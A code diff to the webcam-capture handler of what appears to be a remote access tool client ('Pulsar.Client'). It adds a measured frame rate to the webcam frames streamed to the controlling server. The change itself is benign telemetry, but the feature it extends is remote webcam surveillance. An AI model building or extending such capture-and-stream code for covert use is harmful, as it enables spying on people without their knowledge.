@@ -36,6 +36,8 @@ namespace Pulsar.Client.Messages
 
         private readonly Stopwatch _stopwatch = new Stopwatch();
         private int _frameCount = 0;
+        private float _lastFrameRate = 0f;
+        private bool _sendFrameRateNext = false;
 
         public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                              message is GetAvailableWebcams;
@@ -256,8 +258,10 @@ namespace Pulsar.Client.Messages
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
                             Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
+                            _lastFrameRate = _frameCount;
                             _frameCount = 0;
                             _stopwatch.Restart();
+                            _sendFrameRateNext = true;
                         }
                     }
 
@@ -318,21 +322,30 @@ namespace Pulsar.Client.Messages
                 _webcam = null;
             }
         }
-
+        
         private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
         {
             if (frameData == null || _clientMain == null) return;
 
             try
             {
-                _clientMain.Send(new GetWebcamResponse
+                var response = new GetWebcamResponse
                 {
                     Image = frameData,
                     Quality = _streamCodec.ImageQuality,
                     Monitor = _streamCodec.Monitor,
                     Resolution = _streamCodec.Resolution,
-                    IsLastRequestedFrame = isLastRequestedFrame
-                });
+                    IsLastRequestedFrame = isLastRequestedFrame,
+                    FrameRate = 0f
+                };
+
+                if (_sendFrameRateNext)
+                {
+                    response.FrameRate = _lastFrameRate;
+                    _sendFrameRateNext = false;
+                }
+
+                _clientMain.Send(response);
             }
             catch (Exception ex)
             {
